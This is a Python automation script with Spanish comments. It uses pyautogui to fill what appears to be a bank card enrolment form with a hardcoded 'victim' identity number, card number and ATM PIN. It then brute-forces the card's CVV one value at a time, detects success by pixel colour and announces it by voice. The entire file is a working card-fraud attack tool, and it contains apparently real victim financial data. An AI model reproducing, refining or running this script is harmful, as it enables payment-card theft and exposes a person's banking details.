import pyautogui as robot
import time 
import pyttsx3 #voz

afiliacion = 1622,1009
tipodedocumento = 1427,572
click_dni = 1406,417
Ndocumento = 1430,639
Ntarjeta = 1446,704
Nclavecajero = 1420,907
CVV = 1408,792
continuar = 1640,995
reintentar = 1637,984
punto_colorazul = 1445,429
#primercontinuar = 
escape = 1895,87

victima_tar = "4551038280402053"
victima_dni = "20880136"
victima_pasw = "1234"
#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")
#voz
engine = pyttsx3.init()
engine.setProperty("rate",150)
#text = "holaaaaaaaaaaaa"
#engine.say(text)
#engine.runAndWait()

#Borrar

#Borrar

#Pedir datos
inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	robot.click(clicks=click)

#Logeandose primero
''' no afiliacion es 
numerodedocumento = robot.locateOnScreen('NumeroDeDocumento.png', confidence=0.9)
abrir(numerodedocumento)
time.sleep(0.5)
robot.typewrite(victima_dni)
time.sleep(0.5)
abrir(primercontinuar)
time.sleep(1)'''
#clickear Afiliate!

abrir(afiliacion,click=1)
time.sleep(0.5)
abrir(afiliacion,click=1)
time.sleep(2)

#Registrar datos:
abrir(tipodedocumento)
time.sleep(1)
abrir(click_dni)

abrir(Ndocumento)
robot.typewrite(victima_dni)
time.sleep(0.5)
abrir(Ntarjeta)
robot.typewrite(victima_tar)
time.sleep(0.5)
abrir(Nclavecajero)
robot.typewrite(victima_pasw)
time.sleep(0.5)

#ccv intento
abrir(CVV)
robot.typewrite(str(inicio)) #tipear
abrir(continuar)
time.sleep(3)
abrir(reintentar)
time.sleep(2)

print(":D")
#tx1 ="Iniciando"
#engine.say(tx1)
contador = 0 # para reiniciar 
registro = open("registro.txt","a")
try:
	while inicio>fin :  # >  < # desde 999 para abajo
		contador = contador + 1
		bandera = "flag"
		#print("entrare")
		while bandera == "flag":
			try:
				#Verificar desde un principio mejor:
				print("Verificando...")
				#time.sleep(0.2)
				screenshot = robot.screenshot()
				img = screenshot.getpixel((1445,429))
				valor = robot.pixelMatchesColor(1445,429, (7,33,70))
				print(valor)
				bandera = "noflag"
			except:
				bandera = "flag"
		#print("no entre")
		#time.sleep(0.1)
		if valor == False: # Osea no es azul, sino blanco, encontraod!!!
			registro.close()
			txt= "Encontradoooo"
			print(txt)
			engine.say(txt)
			engine.runAndWait()
			robot.alert("Encontrado!!!!")
			time.sleep(3)
			break
		else:
			print("cvv incorrecto")

		if contador/30 == 1 : # Reiniciar 
			print("Reiniciando, esperar por favor")
			abrir(escape)
			time.sleep(2)

			abrir(afiliacion,click=1)
			time.sleep(1)
			abrir(afiliacion,click=1)
			time.sleep(3)
			#Registrar datos:

			abrir(tipodedocumento)
			time.sleep(1)
			abrir(click_dni)
			time.sleep(0.3)
			abrir(Ndocumento)
			robot.typewrite(victima_dni)
			time.sleep(0.5)
			abrir(Ntarjeta)
			robot.typewrite(victima_tar)
			time.sleep(0.5)
			abrir(Nclavecajero)
			robot.typewrite(victima_pasw)
			time.sleep(0.5)
			print("Continuando...")
			contador=0

		print("Intentado con: ",inicio)
		time.sleep(0.1)
		abrir(CVV,click=2) # doble click
		time.sleep(0.5)

		inicio = inicio - 1
		robot.typewrite(str(inicio))
		time.sleep(0.5)

		registro.write(str(inicio)) # escribir en el block
		registro.write("\n")

		abrir(continuar)
		time.sleep(3)
		#No es pe
		abrir(reintentar)
		time.sleep(0.3)
		#time.sleep(2)
	
	print("Intentado con: ",inicio)
	registro.close()
	print("Programa finalizado con exito")
	txt= "Programa finalizado con exito"
	engine.say(txt)
	engine.runAndWait()
except:
	registro.close()
	robot.alert("ERROR")
	txt= "Error en el programa"
	engine.say(txt)
	engine.runAndWait()
	print(txt)
	print("\nEl numero se quedó en: ", inicio)
	time.sleep(10)





